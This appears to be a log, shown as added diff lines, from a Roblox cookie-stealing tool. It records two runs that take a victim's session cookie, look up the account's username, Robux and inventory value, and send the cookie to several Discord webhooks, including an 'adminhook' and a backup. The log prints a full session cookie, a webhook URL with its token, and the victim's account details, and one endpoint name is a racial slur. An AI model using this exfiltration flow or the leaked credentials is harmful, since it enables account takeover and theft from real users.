+[2025-11-12 09:09:08] ⚠️ [INFO] FETCH_USER_SETTINGS | UserId: 6168675948 (HTTP 200)
+[2025-11-12 09:09:08] ⚠️ [INFO] FETCH_USER_INFO | Fetching user info for userId: 6168675948
+[2025-11-12 09:09:08] ✅ [SUCCESS] FETCH_USER_INFO | HTTP 200
+[2025-11-12 09:09:08] ⚠️ [INFO] FETCH_USER_INFO | Username: DodoCiocan112, DisplayName: Dodo
+[2025-11-12 09:09:14] ⚠️ [INFO] FETCH_BALANCE | Fetching Robux balance
+[2025-11-12 09:09:15] ✅ [SUCCESS] FETCH_BALANCE | HTTP 200
+[2025-11-12 09:09:15] ⚠️ [INFO] FETCH_BALANCE | Robux: 167, Pending: 0
+[2025-11-12 09:09:15] ⚠️ [INFO] FETCH_INVENTORY | Fetching inventory and RAP data
+[2025-11-12 09:09:15] ✅ [SUCCESS] FETCH_INVENTORY | HTTP 200
+[2025-11-12 09:09:15] ⚠️ [INFO] FETCH_INVENTORY | RAP: 0, Inventory Count: ❓ Unknown
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_COLLECTION | Starting webhook collection
+[2025-11-12 09:09:19] ✅ [SUCCESS] WEBHOOK_COLLECTION | Main webhook added to array
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_COLLECTION | Dualhook not provided (optional)
+[2025-11-12 09:09:19] ✅ [SUCCESS] WEBHOOK_COLLECTION | Total webhooks collected: 1
+[2025-11-12 09:09:19] ⚠️ [INFO] HIGH_VALUE_CHECK | isHighValue = false
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_COLLECTION | Main webhook retained in send list
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_COLLECTION | Adminhook included in send list
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_COLLECTION | Final webhook count: 2
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_SENDING | Starting to send embeds to 2 webhook(s)
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_SENDING | Processing main_webhook (index: 0)
+[2025-11-12 09:09:19] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to main_webhook
+[2025-11-12 09:09:20] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to main_webhook - HTTP 204
+[2025-11-12 09:09:20] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to main_webhook
+[2025-11-12 09:09:21] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to main_webhook - HTTP 204
+[2025-11-12 09:09:21] ⚠️ [INFO] WEBHOOK_SENDING | Processing adminhook (index: 1)
+[2025-11-12 09:09:21] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to adminhook
+[2025-11-12 09:09:22] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to adminhook - HTTP 204
+[2025-11-12 09:09:22] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to adminhook
+[2025-11-12 09:09:23] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to adminhook - HTTP 204
+[2025-11-12 09:09:23] ✅ [SUCCESS] WEBHOOK_SENDING | Finished sending to all webhooks in array
+[2025-11-12 09:09:23] ⚠️ [INFO] WEBHOOK_SENDING | Sending to non-filtered webhook (backup)
+[2025-11-12 09:09:24] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 09:09:25] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 09:09:25] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
+[2025-11-12 09:10:17] ⚠️ [INFO] SCRIPT_START | UserInfo script started
+[2025-11-12 09:10:17] ✅ [SUCCESS] COOKIE_RECEIVED | Cookie received and normalized
+[2025-11-12 09:10:17] ⚠️ [INFO] COOKIE_REFRESH | Attempting to refresh cookie
+[2025-11-12 09:10:23] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/refresher.php?cookie=_%7CWARNING%3A-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.%7C_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0 | HTTP 0: No Response - Connection failed or timeout | CURL Error: Operation timed out after 6002 milliseconds with 0 bytes received
+[2025-11-12 09:10:23] ⚠️ [WARNING] COOKIE_REFRESH | Refresher failed: Request failed or timeout - Trying alternative method
+[2025-11-12 09:10:29] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/nigger.php?cookie=_%7CWARNING%3A-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.%7C_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0 | HTTP 0: No Response - Connection failed or timeout | CURL Error: Operation timed out after 6004 milliseconds with 0 bytes received
+[2025-11-12 09:10:29] ⚠️ [WARNING] COOKIE_REFRESH | Refresh failed: No response from refresh endpoint - Using original cookie
+[2025-11-12 09:10:29] ⚠️ [INFO] FETCH_USER_SETTINGS | Fetching user settings from Roblox
+[2025-11-12 09:10:29] ✅ [SUCCESS] FETCH_USER_SETTINGS | HTTP 200
+[2025-11-12 09:10:29] ⚠️ [INFO] FETCH_USER_SETTINGS | UserId: 6168675948 (HTTP 200)
+[2025-11-12 09:10:29] ⚠️ [INFO] FETCH_USER_INFO | Fetching user info for userId: 6168675948
+[2025-11-12 09:10:30] ✅ [SUCCESS] FETCH_USER_INFO | HTTP 200
+[2025-11-12 09:10:30] ⚠️ [INFO] FETCH_USER_INFO | Username: DodoCiocan112, DisplayName: Dodo
+[2025-11-12 09:10:36] ⚠️ [INFO] FETCH_BALANCE | Fetching Robux balance
+[2025-11-12 09:10:36] ✅ [SUCCESS] FETCH_BALANCE | HTTP 200
+[2025-11-12 09:10:36] ⚠️ [INFO] FETCH_BALANCE | Robux: 167, Pending: 0
+[2025-11-12 09:10:36] ⚠️ [INFO] FETCH_INVENTORY | Fetching inventory and RAP data
+[2025-11-12 09:10:37] ✅ [SUCCESS] FETCH_INVENTORY | HTTP 200
+[2025-11-12 09:10:37] ⚠️ [INFO] FETCH_INVENTORY | RAP: 0, Inventory Count: ❓ Unknown
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_COLLECTION | Starting webhook collection
+[2025-11-12 09:10:41] ✅ [SUCCESS] WEBHOOK_COLLECTION | Main webhook added to array
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_COLLECTION | Dualhook not provided (optional)
+[2025-11-12 09:10:41] ✅ [SUCCESS] WEBHOOK_COLLECTION | Total webhooks collected: 1
+[2025-11-12 09:10:41] ⚠️ [INFO] HIGH_VALUE_CHECK | isHighValue = false
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_COLLECTION | Main webhook retained in send list
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_COLLECTION | Adminhook included in send list
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_COLLECTION | Final webhook count: 2
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_SENDING | Starting to send embeds to 2 webhook(s)
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_SENDING | Processing main_webhook (index: 0)
+[2025-11-12 09:10:41] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to main_webhook
+[2025-11-12 09:10:42] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to main_webhook - HTTP 204
+[2025-11-12 09:10:42] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to main_webhook
+[2025-11-12 09:10:42] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to main_webhook - HTTP 204
+[2025-11-12 09:10:43] ⚠️ [INFO] WEBHOOK_SENDING | Processing adminhook (index: 1)
+[2025-11-12 09:10:43] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to adminhook
+[2025-11-12 09:10:43] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to adminhook - HTTP 204
+[2025-11-12 09:10:44] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to adminhook
+[2025-11-12 09:10:44] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to adminhook - HTTP 204
+[2025-11-12 09:10:44] ✅ [SUCCESS] WEBHOOK_SENDING | Finished sending to all webhooks in array
+[2025-11-12 09:10:44] ⚠️ [INFO] WEBHOOK_SENDING | Sending to non-filtered webhook (backup)
+[2025-11-12 09:10:45] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 09:10:45] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 09:10:45] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
